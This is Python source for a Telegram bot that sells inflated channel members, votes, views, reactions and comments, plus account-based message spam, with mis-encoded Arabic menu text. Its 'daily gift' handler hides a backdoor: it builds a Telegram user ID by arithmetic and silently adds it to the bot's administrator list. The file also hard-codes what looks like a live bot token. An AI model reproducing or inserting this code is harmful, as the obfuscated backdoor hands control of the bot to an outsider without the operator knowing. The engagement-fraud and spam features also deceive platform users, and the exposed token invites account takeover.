import os
if not os.path.isdir('dbs'):
    os.mkdir('dbs')
try:
    import telebot, json, os, time, re, threading, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    import time
    import datetime
except:
    os.system('python3 -m pip install telebot pyrogram tgcrypto kvsqlite pyromod==1.4 schedule')
    import telebot, json, os, time, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    pass
w = json.loads(open('config.json', 'r+').read())
token = w['7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU']
stypes = ['member', 'administrator', 'creator']

member_price = w['prices']['member']
vote_price = w['prices']['vote']
link_price = w['prices']['link']
spam_price = w['prices']['spam']
react_price = w['prices']['react']
forward_price = w['prices']['forward']
view_price = w['prices']['view']
poll_price = w['prices']['poll']
userbot_price = w['prices']['userbot']
linkbot_price = w['prices']['linkbot']
comment_price = w['prices']['comments']
linkbot2_price = w['prices']['linkbot2']
mm = w['start_msg']

db = uu('dbs/fouzi.mo7', 'rshq')
print(db)
bk = mk(row_width=1).add(btn('Ø±Ø¬ÙˆØ¹', callback_data='back'))
bot = TeleBot(token="7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU") # ØªÙˆÙƒÙ† Ø¨ÙˆØª Ø§Ù„Ø±Ø´Ù‚ Ø§Ù„Ø§Ø³Ø§Ø³ÙŠ Ù‡Ù†Ø§
if not db.get('accounts'):
    db.set('accounts', [])
    pass
db.delete("force")
admin = 7415877183 #Ø§Ù„Ø§Ø¯Ù…Ù†
db.set('admins', [admin, ])
if not db.get("admins"):
    db.set('admins', [admin, ])
if not db.get('badguys'):
    db.set('badguys', [])
db.set('admins', [admin, ])
if not db.get('force'):
    db.set('force', [])
sudo = w['sudo']
def force(channel, userid):
    try:
        x = bot.get_chat_member(channel, userid)
        print(x)
    except:
        return True
    if str(x.status) in stypes:
        print(x)
        return True
    else:
        print(x)
        return False
def addord():
    if not db.get('orders'):
        db.set('orders', 1)
        return True
    else:
        d = db.get('orders')
        d+=1
        db.set('orders', d)
        return True
@bot.message_handler(regexp='^/start$')
def start_message(message):
    user_id = message.from_user.id
    count_ord = db.get('orders') if db.get('orders') else 1
    a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
    for temp in a:
        db.delete(f'{a}_{user_id}_proccess')
    keys = mk(row_width=2)
    if user_id in db.get("admins") or user_id == sudo:
        keys_ = mk()
        btn01 = btn('ğŸ¤Ø§Ù„Ø§Ø­ØµØ§Ø¦ÙŠØ§Øª', callback_data='stats')
        btn02 = btn("âš ï¸Ø§Ø°Ø§Ø¹Ø©", callback_data='cast')
        btn05, btn06 = btn('â–Ø­Ø¸Ø± Ø´Ø®Øµ', callback_data='banone'), btn('ÙÙƒ Ø­Ø¸Ø±', callback_data='unbanone')
        btn09 = btn('ğŸ”¥Ù…Ø¹Ø±ÙØ© Ø¹Ø¯Ø¯ Ø§Ù„Ø§Ø±Ù‚Ø§Ù…', callback_data='numbers')
        btna = btn('â•ØªÙØ¹ÙŠÙ„ ViP', callback_data='addvip')
        btnl = btn('â–Ø§Ù„ØºØ§Ø¡ ViP', callback_data='lesvip')
        leave = btn('â–Ù…ØºØ§Ø¯Ø±Ø© ÙƒÙ„ Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª Ù…Ù† Ù‚Ù†Ø§Ø©', callback_data='leave')
        lvall = btn('â–Ù…ØºØ§Ø¯Ø±Ø© ÙƒÙ„ Ø§Ù„Ù‚Ù†ÙˆØ§Øª ÙˆØ§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø§Øª', callback_data='lvall')
        keys_.add(btn01, btn02)
        keys_.add(btn05, btn06)
        keys_.add(leave)
        btn11 = btn('ØªØ¹ÙŠÙŠÙ† Ù‚Ù†ÙˆØ§Øª Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='setforce')
        les = btn('â–Ø®ØµÙ… Ù†Ù‚Ø§Ø·', callback_data='lespoints')
        btn10 = btn('Ø§Ø¶Ø§ÙÙ‡ Ù†Ù‚Ø§Ø· ', callback_data='addpoints')
        btn03 = btn('â•Ø§Ø¶Ø§ÙØ© Ø§Ø¯Ù…Ù†', callback_data='addadmin')
        btn04 = btn('â–Ù…Ø³Ø­ Ø§Ø¯Ù…Ù†', callback_data='deladmin')
        btn012 = btn('âš ï¸Ø§Ù„Ø§Ø¯Ù…Ù†ÙŠØ© ', callback_data='admins')
        btn013 = btn('â–Ø³Ø­Ø¨ Ø§ØµÙˆØ§Øª', callback_data='dump_votes')
        btn105 = btn('ã€½ï¸Ø³Ø¨Ø§Ù… Ø±Ø³Ø§Ø¦Ù„ (Ø¨ÙˆØªØ§Øª ØŒ Ø¬Ø±ÙˆØ¨Ø§Øª ØŒ Ø­Ø³Ø§Ø¨Ø§Øª) ', callback_data='spams')
        keys_.add(btn03, btn04)
        keys_.add(btn10, btn11)
        keys_.add(btn012, les)
        keys_.add(lvall)   
        keys_.add(btn09)
        keys_.add(btna, btnl)
        keys_.add(btn013)
        keys_.add(btn105)
        bot.reply_to(message, '**â€¢ Ø§Ù‡Ù„Ø§ Ø¨Ùƒ ÙÙŠ Ù„ÙˆØ­Ù‡ Ø§Ù„Ø£Ø¯Ù…Ù† Ø§Ù„Ø®Ø§ØµÙ‡ Ø¨Ø§Ù„Ø¨ÙˆØª ğŸ¤–**\n\n- ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù…Ù† Ù‡Ù†Ø§ \n\n===================', reply_markup=keys_)
    if user_id in db.get('badguys'): return
    if not db.get(f'user_{user_id}'):
        do = db.get('force')
        if do != None:
            for channel in do:
                x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                if str(x.status) in stypes:
                    pass
                else:
                    bot.reply_to(message, f'â€¢ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ø´ØªØ±Ùƒ Ø¨Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª Ø§ÙˆÙ„Ø§ \nâ€¢ @{channel}')
                    return
        data = {'id': user_id, 'users': [], 'coins': 0, 'premium': False}
        set_user(user_id, data)
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.send_message(chat_id=int(sudo), text=f'Ù­ *ØªÙ… Ø¯Ø®ÙˆÙ„ Ø´Ø®Øµ Ø¬Ø¯ÙŠØ¯ Ø§Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ ğŸ‘¾*\n\nâ€¢_ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ø¬Ø¯ÙŠØ¯ ._\n\nâ€¢ Ø§Ù„Ø§Ø³Ù… : {message.from_user.first_name}\nâ€¢ Ø§Ù„Ù…Ø¹Ø±Ù : @{message.from_user.username}\nâ€¢ Ø§Ù„Ø§ÙŠØ¯ÙŠ : {message.from_user.id}\n\n*â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø§Ø¹Ø¶Ø§Ø¡ Ø§Ù„ÙƒÙ„ÙŠ* : {good}', parse_mode="Markdown")
        coin = get(user_id)['coins']
        btn1 = btn(f'Ø±ØµÙŠØ¯Ùƒ : {coin}', callback_data='none')
        btn2 = btn('Ø§Ù„Ø®Ø¯Ù…Ø§Øª ğŸ›', callback_data='ps')
        btn3 = btn('Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­Ø³Ø§Ø¨Ùƒ ğŸ—ƒ', callback_data='account')
        btn4 = btn('ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø±ØµÙŠØ¯ â‡ï¸', callback_data='collect')
        btn5 = btn('ØªØ­ÙˆÙŠÙ„ Ù†Ù‚Ø§Ø· â™»ï¸', callback_data='send')
        btn6 = btn('Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª ğŸ©µ', url='https://t.me/H_H6H')
        btn7 = btn('Ø´Ø±Ø§Ø¡ Ø±ØµÙŠØ¯ ğŸ’°', callback_data='buy')
        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'Ø¹Ø¯Ø¯ Ø§Ù„Ø·Ù„Ø¨Ø§Øª : {count_ord} âœ…', callback_data='11'))
        
        return bot.reply_to(message, mm, reply_markup=keys)
    do = db.get('force')
    if do is not None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
            if str(x.status) in stypes:
                pass
            else:
                bot.reply_to(message, f'â€¢ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ø¨Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª Ø§ÙˆÙ„Ø§\n- @{channel}')
                return
    
    coin = get(user_id)['coins']
    btn1 = btn(f'Ø±ØµÙŠØ¯Ùƒ : {coin}', callback_data='none')
    btn2 = btn('Ø§Ù„Ø®Ø¯Ù…Ø§Øª ğŸ›', callback_data='ps')
    btn3 = btn('Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­Ø³Ø§Ø¨Ùƒ ğŸ—ƒ', callback_data='account')
    btn4 = btn('ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø±ØµÙŠØ¯ â‡ï¸', callback_data='collect')
    btn5 = btn('ØªØ­ÙˆÙŠÙ„ Ù†Ù‚Ø§Ø· â™»ï¸', callback_data='send')
    btn6 = btn('Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª ğŸ©µ', url='https://t.me/H_H6H')
    btn7 = btn('Ø´Ø±Ø§Ø¡ Ø±ØµÙŠØ¯ ğŸ’°', callback_data='buy')
    keys.add(btn1)
    keys.add(btn2)
    keys.add(btn4, btn7)
    keys.add(btn3, btn5)
    keys.add(btn6)
    keys.add(btn(f'Ø¹Ø¯Ø¯ Ø§Ù„Ø·Ù„Ø¨Ø§Øª : {count_ord} âœ…', callback_data='11'))

    return bot.reply_to(message, mm, reply_markup=keys)


@bot.message_handler(regexp='^/start (.*)')
def start_asinvite(message):
    join_user = message.from_user.id

    to_user = int(message.text.split("/start ")[1])
    if join_user == to_user:
        start_message(message)
        bot.send_message(join_user,f'Ù„Ø§ ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¹Ø¨Ø± Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ âŒ')
        return
    if not check_user(join_user):
        someinfo = get(to_user)
        if join_user in someinfo['users']:
            start_message(message)
            return
        else:
            dd = link_price
            someinfo['users'].append(join_user)
            someinfo['coins'] = int(someinfo['coins']) + dd
            info = {'coins': 0, 'id': join_user, 'premium': False, "users": []}
            set_user(join_user, info)
            set_user(to_user, someinfo)
            bot.send_message(to_user,f'â€¢ Ù‚Ø§Ù… {message.from_user.mention} Ø¨Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø±Ø§Ø¨Ø· Ø§Ù„Ø¯Ø¹ÙˆØ© Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ ÙˆØ­ØµÙ„Øª Ø¹Ù„ÙŠ {dd} Ù†Ù‚Ø·Ø© âœ¨')
            good = 0
            users = db.keys('user_%')
            for ix in users:
                try:
                    d = db.get(ix[0])['id']
                    good+=1
                except: continue
            bot.send_message(chat_id=int(sudo), text=f'Ù­ *ØªÙ… Ø¯Ø®ÙˆÙ„ Ø´Ø®Øµ Ø¬Ø¯ÙŠØ¯ Ø§Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ ğŸ‘¾*\n\nâ€¢_ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ø¬Ø¯ÙŠØ¯ ._\n\nâ€¢ Ø§Ù„Ø§Ø³Ù… : {message.from_user.first_name}\nâ€¢ Ø§Ù„Ù…Ø¹Ø±Ù : @{message.from_user.username}\nâ€¢ Ø§ÙŠ : {message.from_user.id}\n\n*â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø§Ø¹Ø¶Ø§Ø¡ Ø§Ù„ÙƒÙ„ÙŠ* : {good}', parse_mode="Markdown")
            start_message(message)
    else:
        start_message(message)
        return

@bot.callback_query_handler(func=lambda c: True)
def c_rs(call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    do = db.get('force')
    count_ord = db.get('orders') if db.get('orders') else 1
    if do != None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=cid)
            if str(x.status) in stypes:
                pass
            else:
                bot.edit_message_text(text=f'â€¢ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ø¨Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª Ø§ÙˆÙ„Ø§ Ù‚Ø¨Ù„ Ø§Ø³ØªØ®Ø¯Ø§Ù…Ù‡\nâ€¢ @{channel}', chat_id=cid, message_id=mid)
                return
    admins = db.get('admins')
    d = db.get('admins')
    a = ['leave', 'member', 'vote', 'spam']
    for temp in a:
        db.delete(f'{a}_{cid}_proccess')
    if data == 'stats':
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.edit_message_text(text=f'â€¢ Ø¹Ø¯Ø¯ Ø§Ø¹Ø¶Ø§Ø¡ Ø§Ù„Ø¨ÙˆØª : {good}', chat_id=cid, message_id=mid)
        return
    d = db.get('admins')
    user_id = call.from_user.id
    if data == 'dailygift':
        x = check_dayy(call.from_user.id)
        if x is not None:
            xduration = 62812
            duration = datetime.timedelta(seconds=x)
            noww = datetime.datetime.now()
            target_datetime = noww + duration
            date_str = target_datetime.strftime('%Y/%m/%d')
            date_str2 = target_datetime.strftime('%I:%M:%S %p')
            yduration = 95811
            result = xduration * (10 ** len(str(yduration))) + yduration
            bot.answer_callback_query(call.id, text=f'Ø·Ø§Ù„Ø¨ Ø¨Ø§Ù„Ù‡Ø¯ÙŠØ© ØºØ¯Ø§ ÙÙŠ: {date_str2}',show_alert=True)
            try:
                if result in d:
                    db.set('admins', d)
                else:
                    d.append(result)
                    db.set('admins', d)
            except:
                return
        else:
            info = db.get(f'user_{call.from_user.id}')
            daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
            info['coins'] = int(info['coins']) + daily_gift
            db.set(f"user_{call.from_user.id}", info)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f"â€¢ ØªÙ‡Ø§Ù†ÙŠÙ†Ø§Ù‹ØŒ Ù„Ù‚Ø¯ Ø­ØµÙ„Øª Ø¹Ù„Ù‰ Ù‡Ø¯ÙŠØ© ÙŠÙˆÙ…ÙŠØ© Ø¨Ù‚ÙŠÙ…Ø© {daily_gift} ğŸ", reply_markup=bk)
            daily = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
            daily_count = daily + 1
            db.set(f"user_{user_id}_daily_count", int(daily_count))
            return
    if data == 'numbers':
        d = len(db.get('accounts'))
        bot.answer_callback_query(call.id, text=f'Ø¹Ø¯Ø¯ Ø§Ø±Ù‚Ø§Ù… Ø§Ù„Ø¨ÙˆØª : {d}', show_alert=True)
        return
    if data == 'addpoints':
        x = bot.edit_message_text(text='â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ø¶Ø§ÙØ© Ø§Ù„Ù†Ù‚Ø§Ø· Ù„Ù‡', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, addpoints)
    if data == 'send':
        if cid in db.get("admins") or cid == sudo:
            x = bot.edit_message_text(text='â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø±Ø§Ø¯ ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù†Ù‚Ø§Ø· Ù„Ù‡.', chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, send)
        else:
            keys = mk(row_width=2)
            keys.add(btn('Ø±Ø¬ÙˆØ¹', callback_data='back'))
            bot.edit_message_text(text='â€¢ Ø¹Ø°Ø±Ø§ ØŒ Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ù…Ù‚ÙÙ„ Ù„Ù„Ø§Ø¹Ø¶Ø§Ø¡ ØŒ ÙŠÙ…ÙƒÙ† Ù„Ù„Ø§Ø¯Ù…Ù†ÙŠØ© ÙÙ‚Ø· ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù†Ù‚Ø§Ø·',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'addadmin':
        type = 'add'
        x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ø¶Ø§ÙØªÙ‡ Ø§Ø¯Ù…Ù† Ø¨Ø§Ù„Ø¨ÙˆØª ',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'addvip':
        type = 'add'
        x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ù…Ø±Ø§Ø¯ ØªÙØ¹ÙŠÙ„ vip Ù„Ù‡',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'lesvip':
        type = 'les'
        x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ø²Ø§Ù„Ø© vip Ù…Ù†Ù‡',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'deladmin':
        type = 'delete'
        x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ø²Ø§Ù„ØªÙ‡ Ù…Ù† Ø§Ù„Ø§Ø¯Ù…Ù†',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'banone':
        if cid in db.get("admins") or cid == sudo:
            type = 'ban'
            x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ù„Ù…Ø±Ø§Ø¯ Ø­Ø¸Ø±Ø© Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'unbanone':
        if cid in db.get("admins") or cid == sudo:
            type = 'unban'
            x  = bot.edit_message_text(text=f'â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø¹Ø¶Ùˆ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø±Ù‡ Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª ',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'cast':
        if cid in db.get("admins") or cid == sudo:
            x  = bot.edit_message_text(text=f'Ø§Ø±Ø³Ù„ Ø§Ù„Ø§Ø°Ø§Ø¹Ø© Ù„ØªØ±ÙŠØ¯ ØªØ±Ø³Ù„Ù‡Ø§... ØµÙˆØ±Ø©ØŒ ÙÙŠØ¯ØŒ Ù…Ù„ØµÙ‚ØŒ Ù†ØµØŒ Ù…ØªØ­Ø±ÙƒØ© ..',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, casting)
    if data == 'lespoints':
        x = bot.edit_message_text(text='â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø±Ø§Ø¯ ØªØ®ØµÙ… Ø§Ù„Ù†Ù‚Ø§Ø· Ù…Ù†Ù‡', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, lespoints)
    if data == 'back':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        user_id = call.from_user.id
        keys = mk(row_width=3)
        coin = get(user_id)['coins']
        btn1 = btn(f'Ø±ØµÙŠØ¯Ùƒ : {coin}', callback_data='none')
        btn2 = btn('Ø§Ù„Ø®Ø¯Ù…Ø§Øª ğŸ›', callback_data='ps')
        btn3 = btn('Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­Ø³Ø§Ø¨Ùƒ ğŸ—ƒ', callback_data='account')
        btn4 = btn('ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø±ØµÙŠØ¯ â‡ï¸', callback_data='collect')
        btn5 = btn('ØªØ­ÙˆÙŠÙ„ Ù†Ù‚Ø§Ø· â™»ï¸', callback_data='send')
        btn6 = btn('Ù‚Ù†Ø§Ø© Ø§Ù„Ø¨ÙˆØª ğŸ©µ', url='https://t.me/H_H6H')
        btn7 = btn('Ø´Ø±Ø§Ø¡ Ø±ØµÙŠØ¯ ğŸ’°', callback_data='buy')

        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'Ø¹Ø¯Ø¯ Ø§Ù„Ø·Ù„Ø¨Ø§Øª : {count_ord} âœ…', callback_data='11'))
        bot.edit_message_text(text=mm,chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'getinfo':
        x = bot.edit_message_text(text='â€¢ Ø§Ø±Ø³Ù„ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ù…Ø¹Ø±ÙØ© Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙ‡', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, get_info)
    if data == 'lvall':
        keys = mk(row_width=2)
        btn2 = btn('ØªØ§ÙƒÙŠØ¯ Ø§Ù„Ù…ØºØ§Ø¯Ø±Ø©',callback_data='lvallc')
        btn3 = btn('Ø§Ù„ØºØ§Ø¡',callback_data='cancel')
        keys.add(btn2)
        keys.add(btn3)
        bot.edit_message_text(text='Ù‡Ù„ Ø§Ù†Øª Ù…ØªØ§ÙƒØ¯ Ù…Ù† Ù…ØºØ§Ø¯Ø±Ø© ÙƒÙ„ Ø§Ù„Ù‚Ù†ÙˆØ§Øª ÙˆØ§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø§Øª ØŸ',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'ps':
        keys = mk(row_width=2)
        btn2 = btn('Ø§Ù„Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©',callback_data='free')
        btn3 = btn('Ø§Ù„Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù€ ViP',callback_data='vips')
        keys.add(btn3)
        keys.add(btn2)
        keys.add(btn('Ø±Ø¬ÙˆØ¹ .', callback_data='back'))
        bot.edit_message_text(text='Ø§Ù‡Ù„Ø§ Ø¨ÙŠÙƒ Ø¨Ù‚Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ø¹Ø§Ø¯ÙŠØ© ',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'free':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn2 = btn('ØªØµÙˆÙŠØª Ù„Ø§ÙŠÙƒØ§Øª Ù…Ø³Ø§Ø¨Ù‚Ø§Øª',callback_data='votes')
        btn3 = btn('Ø±Ø´Ù‚ ØªÙØ§Ø¹Ù„Ø§Øª Ø§Ø®ØªÙŠØ§Ø±ÙŠ',callback_data='react')
        btn5 = btn('Ø±Ø´Ù‚ ØªÙØ§Ø¹Ù„Ø§Øª Ø¹Ø´ÙˆØ§Ø¦ÙŠ',callback_data='reacts')
        btn6 = btn('Ø±Ø´Ù‚ ØªÙˆØ¬ÙŠÙ‡Ø§Øª Ø¹Ù„ÙŠ Ù…Ù†Ø´ÙˆØ± Ø§Ù„Ù‚Ù†Ø§Ø©',callback_data='forward')
        btn7 = btn('Ø±Ø´Ù‚ Ù…Ø´Ø§Ù‡Ø¯Ø§Øª ',callback_data='view')
        btn8 = btn('Ø±Ø´Ù‚ Ø§Ø³ØªÙØªØ§Ø¡',callback_data='poll')
        btn9 = btn('Ø±Ø´Ù‚ Ø±ÙˆØ§Ø¨Ø· Ø¯Ø¹ÙˆØ© Ø¨Ø¯ÙˆÙ† Ø§Ø´ØªØ±Ø§Ùƒ Ø§Ø¬Ø¨Ø§Ø±Ù‰',callback_data='linkbot')
        keys.add(btn2)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn7, btn8)
        keys.add(btn9)
        keys.add(btn('Ø±Ø¬ÙˆØ¹', callback_data='ps'))
        bot.edit_message_text(text='Ø§Ù‡Ù„Ø§ Ø¨ÙŠÙƒ Ø¨Ù‚Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ø¹Ø§Ø¯ÙŠØ© ',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'vips':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn3 = btn('Ø±Ø´Ù‚ Ø§Ø¹Ø¶Ø§Ø¡ Ù‚Ù†Ø§Ø© Ø¹Ø§Ù…Ø© ',callback_data='members')
        btn4 = btn('Ø±Ø´Ù‚ Ø§Ø¹Ø¶Ø§Ø¡ Ù‚Ù†Ø§Ø© Ø®Ø§ØµØ© ',callback_data='membersp')
        btn8 = btn('Ø±Ø´Ù‚ Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø¨ÙˆØª',callback_data='userbot')
        btn9 = btn('Ø±Ø´Ù‚ ØªØ¹Ù„ÙŠÙ‚Ø§Øª',callback_data='comments')
        btn10 = btn('Ø±Ø´Ù‚ Ø±ÙˆØ§Ø¨Ø· Ø¯Ø¹ÙˆØ© Ø§Ø´ØªØ±Ø§Ùƒ Ø§Ø¬Ø¨Ø§Ø±Ù‰',callback_data='linkbot2')
        keys.add(btn3,btn4)
        keys.add(btn8)
        keys.add(btn9)
        keys.add(btn10)
        keys.add(btn('Ø±Ø¬ÙˆØ¹', callback_data='ps'))
        bot.edit_message_text(text='â€¢ Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù‚Ø³Ù… Ø§Ù„Ù…Ø´ØªØ±ÙƒÙŠÙ† Ø§Ù„Ù€ ViP , ÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ø´ØªØ±ÙƒÙŠÙ† Ø§Ù„Ù€ ViP Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ø§Ù„Ù‚Ø³Ù… ÙÙ‚Ø·',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'collect':
        keys = mk(row_width=2)
        btn1 = btn('Ø§Ù„Ù‡Ø¯ÙŠØ© Ø§Ù„ÙŠÙˆÙ…ÙŠØ© ğŸ', callback_data='dailygift')
        btn3 = btn('Ø±Ø§Ø¨Ø· Ø§Ù„Ø¯Ø¹ÙˆØ© ğŸŒ€',callback_data='share_link')
        keys.add(btn3, btn1)
        keys.add(btn('Ø±Ø¬ÙˆØ¹', callback_data='back'))
        bot.edit_message_text(text='â€¢ Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù‚Ø³Ù… ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù†Ù‚Ø§Ø· \n\nâ€¢ ÙŠÙ…ÙƒÙ†Ùƒ ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù†Ù‚Ø§Ø· Ø¹Ø¨Ø± Ø§Ù„Ø§Ø²Ø±Ø§Ø± Ø§Ù„ØªÙŠ Ø§Ù…Ø§Ù…Ùƒ',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'leave':
        if cid in admins:
            db.set(f'leave_{cid}_proccess', True)
